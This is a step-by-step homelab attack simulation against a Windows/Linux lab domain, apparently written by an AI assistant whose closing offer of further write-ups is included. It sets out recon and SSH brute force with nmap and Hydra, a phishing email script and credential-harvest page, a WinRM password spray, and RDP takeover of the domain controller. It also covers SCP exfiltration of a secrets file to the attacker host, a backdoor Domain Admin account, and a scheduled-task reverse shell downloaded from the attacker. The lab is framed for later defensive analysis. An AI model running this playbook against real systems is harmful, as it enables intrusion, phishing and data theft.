This document summarizes the full end-to-end attack simulation performed in the enterprise homelab environment. It follows the kill-chain flow used by threat actors: reconnaissance, initial access, lateral movement, privilege escalation, data exfiltration, and persistence.

The attacker machine is the Kali Linux VM (`project-attacker`), targeting Project’s internal environment.

## Prerequisites

- All VMs in the “Deploy VMs + Services” and “Tools” sections configured
- Attacker machine provisioned
- Network topology active and reachable
- MailHog, Wazuh, Windows/Linux clients, and Domain Controller running

---
## Cyber Attack Overview

The simulation recreates a financially motivated threat actor compromising a corporate network.  
The attacker’s end goal is:
- Capture sensitive data
- Create persistence to return later
- Evade detection as long as possible

The attack follows the core phases used in real-world campaigns.

---
## Reconnaissance

Recon is the initial phase where the attacker gathers information without alerting the target.
### Mandatory VMs
- project-sec-box
- project-corp-svr
- project-attacker

### Network Scan
From attacker (Kali):

```
nmap -p1-1000 -Pn -sV 10.0.0.8/24
```

Flags:
- `-p`: port range
- `-sV`: detect services
- `-Pn`: skip ping checks

Findings:
- SSH service exposed on 10.0.0.8
- Indicates potential admin interface or server service
### Brute-force SSH (Hydra)
Attacker loads default wordlist rockyou.txt:

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8
```

Hydra discovers valid credentials:  
root / november
## Access Server

```
ssh root@10.0.0.8
password: november
```

Initial access achieved.

---
## Initial Access
After SSH compromise, the attacker fingerprint the system.
### Mandatory VMs
- project-sec-box
- project-corp-svr
- project-attacker
- project-linux-client

## Device Enumeration

```
cat /etc/os-release
hostname
ip a
netstat -tuln
ps aux
top
ls -la /home
find / -name "password" 2>/dev/null
```

Key discovery:
- Port 1025 open (SMTP)
- Port 8025 likely MailHog inbox
- Sensitive mail data accessible
### Access MailHog API

```
curl http://10.0.0.8:8025/api/v2/messages
```

Emails referencing user `janed@linux-client` found.  
This gives attacker a target for phishing.

---
## Setup the Phish and Capture Credentials

### Host Phishing Website (Attacker machine)
Clone phishing template:

```
cd /var/www/html
git clone https://github.com/collinsmc23/projectsecurity-e101
sudo touch /var/www/html/creds.log
sudo chmod 666 /var/www/html/creds.log
sudo service apache2 start
```

Captured credentials appear in `creds.log`.
### Craft and Send Phishing Email
On `project-corp-svr`:

Create script:
```
sudo nano send_email.py
```

Content:
```
import smtplib
from email.message import EmailMessage

msg = EmailMessage()
msg["Subject"] = "Update Password!"
msg["From"] = "project-hrteam@corp.project-x-dc.com"
msg["To"] = "janed@linux-client"

msg.set_content("Verify your account.")

html = """<html><body>
<a href='http://10.0.0.50'>Verify My Account</a>
</body></html>"""

msg.add_alternative(html, subtype='html')

with smtplib.SMTP("localhost", 1025) as server:
    server.send_message(msg)
```

Send email:
```
sudo python3 send_email.py
```

### Credential Harvest
On linux-client, email_poller.sh captures the phishing email.  
User submits credentials → attacker reads:

```
cat /var/www/html/creds.log
```

Attacker obtains: janed / password123 (example)
### SSH into linux-client

```
ssh janed@10.0.0.101
```

Access successful.

---
## Lateral Movement + Privilege Escalation

### Mandatory VMs
- project-x-sec-box
- project-x-linux-client
- project-x-win-client
- project-x-dc
- project-x-attacker

### Network Enumeration

```
nmap -Pn -p1-65535 -sV 10.0.0.0/24
```

Findings:  
Ports 5985/5986 open → WinRM endpoint on Windows client.
### Password Spray (NetExec)
Create files:

```
sudo nano users.txt   → Administrator
sudo nano pass.txt    → @Deeboodah1!
```

Spray:
```
nxc winrm 10.0.0.100 -u users.txt -p pass.txt
```

Successful login for Administrator.

### WinRM Shell Access (Evil-WinRM)

```
evil-winrm -I 10.0.0.100 -u Administrator -p @Deeboodah1!
```

Attacker obtains Windows shell with administrator rights.

---
## Lateral Movement 2.0: Domain Controller Access

### Identify Domain

```
nltest /dsgetdc:corp.project-dc.com
```

### RDP into the DC
From attacker:
```
xfreerdp /v:10.0.0.5 /u:Administrator /p:@Deeboodah1! /d:corp.project-dc.com
```

Attacker now controls Domain Controller.
### Find Sensitive Files
Inside:

```
C:\Users\Administrator\Documents\ProductionFiles\secrets.txt
```

---
## Data Exfiltration

### Mandatory VMs

- project-x-sec-box
- project-x-dc
- project-x-attacker

## Transfer File via SCP

On DC (PowerShell):

```
scp ".\secrets.txt" attacker@10.0.0.50:/home/attacker/my_sensitive_file.txt
```

Attacker retrieves file locally.

```
cd /home/attacker
ls
```

Exfiltration complete.

---

# Persistence

## Mandatory VMs

- project-x-sec-box
    
- project-x-dc
    
- project-x-attacker
    

## Create New Admin User

On Domain Controller:

```
net user project-x-user @mysecurepassword1! /add
net localgroup Administrators project-x-user /add
net group "Domain Admins" project-x-user /add
```

Persistent privileged account established.

## Scheduled Task + Reverse Shell

Create reverse shell script on Kali:

```
sudo nano reverse.ps1
```

Script connects back to attacker on port 4444.

Host file via python server:

```
python3 -m http.server
```

Download on DC:

```
wget http://10.0.0.50:8000/reverse.ps1
```

Move to:

```
C:\Users\Administrator\AppData\Local\Microsoft\Windows\
```

Create scheduled task:

```
schtasks /create /tn "PersistenceTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Administrator\AppData\Local\Microsoft\Windows\reverse.ps1" /sc daily /st 12:00
```

## Catch Reverse Shell

On attacker:

```
nc -lvnp 4444
```

Trigger:

```
powershell.exe -executionpolicy bypass .\reverse.ps1
```

Reverse shell connects successfully.

---

# Conclusion

This simulation demonstrated the complete attack chain:

- Recon → Initial Access → Lateral Movement → Domain Compromise
    
- Privilege Escalation → Data Exfiltration → Persistence
    

The exercise shows how weak passwords, exposed services, misconfiguration, and social engineering create a full compromise path inside enterprise environments. The SIEM, endpoint logs, network telemetry, and detections built earlier are used later to analyze and respond to this attack from a defender perspective.

---

If you want, I can also create:

- A full “Defender Write-Up” describing how Wazuh detects each step
    
- MITRE ATT&CK mapping for all actions
    
- A single README summarizing the entire homelab for recruiters
    
- Mermaid diagrams or architecture diagrams for your GitHub repo
    

Just tell me what you prefer.